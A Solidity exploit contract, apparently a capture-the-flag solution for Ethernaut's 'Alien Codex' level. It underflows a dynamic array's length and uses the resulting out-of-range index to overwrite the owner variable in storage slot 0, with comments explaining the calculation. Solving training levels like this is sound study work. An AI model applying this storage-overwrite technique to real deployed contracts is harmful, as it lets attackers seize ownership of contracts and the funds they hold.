// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 19: Alien Codex
// https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272

contract AlienCodex_Hack {
  address alienCodexInstance;

  constructor(address _alienCodexInstance) {
    alienCodexInstance = _alienCodexInstance;
  }

  function takeOwnership(address newOwner) public {
    IAlienCodex c = IAlienCodex(alienCodexInstance);

    // Set contacted variable = true, required for other calls
    c.make_contact();

    // Calling retract() causes "codex" array length to decrease by one, using "codex.length--". Since the codex is an array of bytes32, with length 0, decrementing the length causes an underflow and sets its length to uint256 max value, which is the entire memory storage available for the contract. We can then overwrite any memory slot we want by writing to the correct index in the array.
    c.retract();

    /* Figure out the array index we need that will overwrite owner variable. Variables declared by the contract, including the Ownable contract that it includes:

    slot 0: address private _owner;
            bool public contact;
    slot 1: bytes32[] public codex;
    
    We then calculate what codex index will land in memory slot 0, and pass this to the revise function to overwrite the owner variable in memory.
    */
    uint256 index = (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(0x01)))) + 1;

    bytes32 newOwnerEncoded = bytes32(uint256(uint160(address(newOwner))));
    c.revise(index, newOwnerEncoded);
  }
}

interface IAlienCodex {
  function make_contact() external;
  function retract() external;
  function revise(uint256 i, bytes32 _content) external;
  function record(bytes32 _content) external;
}